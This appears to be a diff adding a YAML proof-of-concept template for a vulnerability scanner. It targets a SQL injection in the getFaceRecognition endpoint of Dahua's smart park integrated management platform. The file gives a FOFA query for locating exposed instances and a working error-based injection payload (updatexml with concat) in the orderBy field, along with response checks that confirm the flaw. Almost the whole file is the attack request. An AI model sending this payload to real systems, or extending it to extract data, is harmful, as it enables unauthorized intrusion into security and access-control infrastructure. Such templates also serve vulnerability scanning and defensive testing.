@@ -1,0 +1,17 @@
+id: poc-yaml-dahua-zhyq-integrated-management-platform-getfacerecognition-sqli
+info:
+  name: 大华智慧园区综合管理平台 getFaceRecognition SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大华智慧园区综合管理平台
+  fofa: app="dahua-智慧园区综合管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml%281,concat%280x7e,%28select%20md5%28{{.t1}}%29%29,0x7e%29,1%29--%22%7D/extend/1
+  expression: "status_code == 500\n&& contains(body,substr(t2,0,31))\n&& contains(body,\"\
+    XPATH syntax error\") \n&& contains(body,\"soap:Server\")\n"
+transport: http
